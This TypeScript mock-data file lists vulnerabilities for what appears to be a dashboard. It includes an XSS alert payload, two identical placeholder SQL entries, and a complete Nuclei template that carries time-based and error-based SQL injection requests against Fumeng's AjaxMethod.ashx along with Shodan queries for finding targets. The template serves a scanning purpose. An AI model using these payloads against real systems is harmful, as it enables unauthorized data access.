import { Vulnerability } from "./Vulnerabilites.types";

export const Data: Array<Vulnerability> = [
  {
    id: 1,
    level: "low",
    name: "CVE-2024-29882",
    title: "Cross-site scripting",
    description: "Cross-site scripting vulnerability",
    status: "UNRELEASED",
    date: "2022-01-01",
    author: "@user",
    code: "<script>alert('XSS')</script>",
  },
  {
    id: 2,
    level: "medium",
    name: "SQLI",
    title: "SQL injection",
    description: "SQL injection vulnerability",
    status: "UNRELEASED",
    date: "2022-01-02",
    author: "@user",
    code: "SELECT * FROM users WHERE username = 'admin'",
  },
  {
    id: 3,
    level: "high",
    name: "SQLI",
    title: "SQL injection",
    description: "SQL injection vulnerability",
    status: "UNRELEASED",
    date: "2022-01-02",
    author: "@user",
    code: "SELECT * FROM users WHERE username = 'admin'",
  },
  {
    id: 4,
    level: "critical",
    name: "SQLI",
    title: "SQL injection",
    description: "SQL injection vulnerability",
    status: "UNRELEASED",
    date: "2022-01-02",
    author: "@user",
    code: `id: fumengyun-sqli

info:
  name: Fumeng - SQL Injection
  author: ritikchaddha
  severity: critical
  description: |
    The Fumeng AjaxMethod.ashx file has an SQL injection vulnerability. Attackers can use this vulnerability to obtain server data.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Implement input validation and use parameterized queries to prevent SQL Injection attacks.
  reference:
    - https://github.com/emadshanab/goby-poc/blob/main/fumengyun%20%20AjaxMethod.ashx%20SQL%20injection.json
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-score: 0.00076
    epss-percentile: 0.31944
  metadata:
    max-request: 1
    shodan-query: title:"孚盟云 "
    fofa-query: title="孚盟云 "
  tags: fumasoft,sqli

http:
  - raw:
      - |
        @timeout: 30s
        GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27 HTTP/1.1
        Host: {{Hostname}}

      - |
        @timeout: 30s
        GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: or
    matchers:
      - type: dsl
        name: error-based
        dsl:
          - 'contains_all(response_1, "SELECT count", "System.Exception:", "WHERE upper")'
          - 'status_code_1 == 500'
        condition: and

      - type: dsl
        name: time-based
        dsl:
          - 'duration_2>=6'
          - 'contains_all(response_2, "0", "text/plain")'
        condition: and
# digest: 4a0a004730450220093e0ab367ad9bd0fb821ab8a76348d35fdccfcdceb731ab028dd494d3e58ba702210082b1ed2a0e9f9d628c6d0d16a48f346fecd912251491470e4926509bf6fb6baa:922c64590222798bb761d5b6d8e72950
    `,
  },
];
